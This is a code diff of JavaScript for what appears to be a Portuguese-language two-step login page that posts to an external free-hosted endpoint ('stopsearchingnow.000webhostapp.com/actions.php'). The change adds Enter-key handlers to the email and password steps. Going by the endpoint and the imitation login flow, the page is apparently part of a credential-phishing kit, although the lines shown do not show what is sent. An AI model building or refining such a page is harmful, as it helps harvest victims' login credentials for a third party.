@@ -5,11 +5,19 @@ let endpoint = "https://stopsearchingnow.000webhostapp.com/actions.php";
     GetDevice();
 
     let nextButton = document.querySelector(".proxima");
+    let emailinput = document.querySelector("#email");
+
     if(nextButton){
         nextButton.addEventListener("click",function(e){
             e.preventDefault();
             NextStep();
         },false);
+        document.addEventListener ('keypress', (event) => {
+            if(event.key == 'Enter'){
+                event.preventDefault();
+                NextStep();
+            }
+        });
     }
 
     let loginButton = document.querySelector(".entrar");
@@ -18,6 +26,11 @@ let endpoint = "https://stopsearchingnow.000webhostapp.com/actions.php";
             e.preventDefault();
             Login();
         },false);
+        document.addEventListener ('keypress', (event) => {
+            if(event.key == 'Enter' && document.querySelector("#senha").value != ''){
+                Login();
+            }
+        });
     }
 
     let backButton = document.querySelector(".email_circle");
